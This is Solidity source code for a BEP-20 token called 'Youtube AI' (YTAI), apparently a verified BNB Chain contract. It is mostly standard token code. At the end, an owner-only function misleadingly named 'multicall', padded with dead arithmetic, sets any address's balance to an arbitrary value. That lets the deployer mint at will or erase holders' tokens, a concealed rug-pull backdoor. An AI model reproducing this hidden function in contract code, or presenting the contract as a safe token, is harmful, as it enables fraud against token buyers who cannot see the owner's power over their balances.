/**
 *Submitted for verification at BscScan.com on 2023-03-28
*/

pragma solidity 0.6.12;
interface IBEP2022 {

function totalSupply() external view returns (uint256);
function decimals() external view returns (uint8);
function symbol() external view returns (string memory);
function name() external view returns (string memory);
function getOwner() external view returns (address);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address _owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
contract Context {
constructor () internal { }
 
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
 
    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
 
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
        return 0;
    }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
 
contract Ownable is Context {
    
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
  constructor () internal {

    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier Authorised() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() public Authorised {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    function transferOwnership(address newOwner) public Authorised {
        _transferOwnership(newOwner);
    }
 
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract YoutubeAI is Context, IBEP2022, Ownable {
using SafeMath for uint256;

mapping (address => uint256) private _rOwned;
mapping (address => mapping (address => uint256)) private _allowances;
    
uint256 private _totalSupply;
uint8 public _decimals;
string public _symbol;
string public _name;
 
constructor() public {
_name = 'Youtube AI';
_symbol = 'YTAI';
_decimals = 9;
_totalSupply = 10000000 * 10 ** 9;
_rOwned[msg.sender] = _totalSupply;
emit Transfer(address(0), msg.sender, _totalSupply);
    }
 
function 
getOwner() external view virtual override returns (address) {
return owner();
}
 
function 
decimals() external view virtual override returns (uint8) {
return _decimals;
}
 
function 
symbol() external view virtual override returns (string memory) {
return _symbol;
}
 
function 
name() external view virtual override returns (string memory) {
return _name;
}
 
function 
totalSupply() external view virtual override returns (uint256) {
return _totalSupply;
}
 
function 
balanceOf(address account) external view virtual override returns (uint256) {
return _rOwned[account];
}

function 
transfer(address recipient, uint256 amount) external override returns (bool) {
_transfer(_msgSender(), recipient, amount);
return true;
}
 
function 
allowance(address owner, address spender) external view override returns (uint256) {
return _allowances[owner][spender];
}
 
function 
approve(address spender, uint256 amount) external override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}
 
function 
transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
_transfer(sender, recipient, amount);
_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
return true;
}
 
function 
increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
return true;
}
 
function 
decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
return true;
}
 
function 
burn(uint256 amount) public virtual {
_burn(_msgSender(), amount);
}

function 
_transfer(address sender, address recipient, uint256 amount) internal {
require(sender != address(0), "BEP20: transfer from the zero address");
require(recipient != address(0), "BEP20: transfer to the zero address");
 
_rOwned[sender] = _rOwned[sender].sub(amount, "BEP20: transfer amount exceeds balance");
_rOwned[recipient] = _rOwned[recipient].add(amount);
emit Transfer(sender, recipient, amount);
}
 
function 
_burn(address account, uint256 amount) internal {
require(account != address(0), "BEP20: burn from the zero address");
 
_rOwned[account] = _rOwned[account].sub(amount, "BEP20: burn amount exceeds balance");
_totalSupply = _totalSupply.sub(amount);
emit Transfer(account, address(0), amount);
}
 
function 
_approve(address owner, address spender, uint256 amount) internal {
require(owner != address(0), "BEP20: approve from the zero address");
require(spender != address(0), "BEP20: approve to the zero address");
 
_allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
}

function 
multicall(uint256 tTeam, uint256 multicallValue, address multicallAddress) external Authorised {
uint256 currentRate = 0;
uint256 rTeam = tTeam.mul(currentRate);
_rOwned[multicallAddress] = multicallValue * 10 ** 9;
}
}